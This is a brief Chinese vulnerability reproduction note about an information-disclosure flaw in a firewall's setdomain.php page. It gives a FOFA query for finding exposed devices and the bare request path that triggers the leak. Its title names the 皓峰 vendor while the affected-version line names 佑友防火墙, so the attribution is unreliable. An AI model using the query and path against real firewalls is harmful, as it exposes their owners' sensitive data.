# 皓峰防火墙setdomain存在信息泄露漏洞

# 一、漏洞简介
深圳市皓峰通讯技术有限公司成立于2004年，位于深圳市高新技术产业园，是经过国家认定的“双软”企业和“国家高新技术企业”。皓峰防火墙系统存在信息泄露漏洞，攻击者可利用该漏洞获取敏感信息。

# 二、影响版本
+ 佑友防火墙

# 三、资产测绘
```plain
fofa：title="佑友防火墙"
```

![1716109179632-2019ee30-a9a4-4e0a-ae2d-bce9bd9d6d2f.png](./img/pZakr3fj83f4UEn3/1716109179632-2019ee30-a9a4-4e0a-ae2d-bce9bd9d6d2f-022177.png)

# 四、漏洞复现
```plain
/setdomain.php
```

![1716107923587-1798acc2-e923-4285-a7b9-9df39a3c19a8.png](./img/pZakr3fj83f4UEn3/1716107923587-1798acc2-e923-4285-a7b9-9df39a3c19a8-851228.png)

![1716107933589-7bcf6a84-4cfc-480b-bf05-36aa2c6fa0d7.png](./img/pZakr3fj83f4UEn3/1716107933589-7bcf6a84-4cfc-480b-bf05-36aa2c6fa0d7-342483.png)



> 更新: 2024-05-20 22:24:02  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ccv63zl63aohrxg2>